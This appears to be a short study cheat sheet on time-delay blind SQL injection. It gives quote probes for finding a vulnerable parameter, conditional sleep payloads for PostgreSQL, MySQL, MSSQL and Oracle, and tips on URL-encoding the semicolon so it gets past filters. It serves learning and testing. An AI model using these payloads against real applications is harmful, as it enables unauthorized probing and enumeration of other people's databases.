
## Time Delay Based SQLi

- In time-delay based SQL injection, we cannot see any results or error messages from the application. So instead, we rely on how long the database takes to respond. By crafting payloads that introduce a delay when a condition is **true**, and no delay when it is **false**, we can infer information based on the response time. This allows us to perform enumeration by asking true/false questions and observing whether the server response is delayed or not.

### 1. Check Parameter Vulnerability

```sql
'
''
/*
find out which parameter is vulnerable to SQLi first.
Insert each payload above to look for database response variation.
The paramter can be a trackingID, sessionID etc...
*/
```

### 2. Testing Entries

```sql
-- PostgreSQL
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- MySQL / MariaDB
'%3BSELECT+IF(1=1,SLEEP(10),SLEEP(0))#

-- Microsoft SQL Server (MSSQL)
'%3BIF(1=1)+WAITFOR+DELAY+'0:0:10'--

-- Oracle
'%3BSELECT+CASE+WHEN+(1=1)+THEN+DBMS_PIPE.RECEIVE_MESSAGE('ADS',10)+ELSE+NULL+END+FROM+DUAL--

/*
since blind sqli don't return visible results so
the payloads are designed to ask true/false questions using time delay and 
based on that we can perform database enumeration.
If the payload statement is true then wait for 10 seconds else no waiting. The time is in seconds.

%3B means ; (semicolon) 
Use `%3B` instead of `;` because `;` is a special character in URLs and may be blocked, split, or misinterpreted by servers or filters. Encoding it as `%3B` ensures it is safely transmitted and reaches the database reliably.
You can also write (;) and then select the entire payload and click URL encoding option.
*/
```


